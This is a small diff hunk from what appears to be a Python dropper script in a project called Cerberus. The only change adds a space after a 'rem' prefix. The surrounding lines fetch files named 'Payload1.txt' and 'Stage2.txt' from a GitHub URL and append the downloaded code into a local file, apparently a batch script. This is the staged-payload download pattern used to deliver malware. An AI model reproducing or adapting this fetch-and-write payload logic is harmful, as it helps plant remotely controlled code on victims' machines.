@@ -17,7 +17,7 @@ if os.path.isfile(filename) == False:
 with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Payload1.txt") as retrieve:
     data = retrieve.read().decode("utf-8")                       # Takes code from URL and decodes it to remove useless newline characters in code
     with open(filename, "a+") as file: 
-        file.write("rem" + rN + "\n" + data)                     # Opens paylaod in read and write mode and appends code retrieved into it
+        file.write("rem " + rN + "\n" + data)                     # Opens paylaod in read and write mode and appends code retrieved into it
 
 with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage2.txt") as retrieve:
     data = retrieve.read().decode("utf-8")
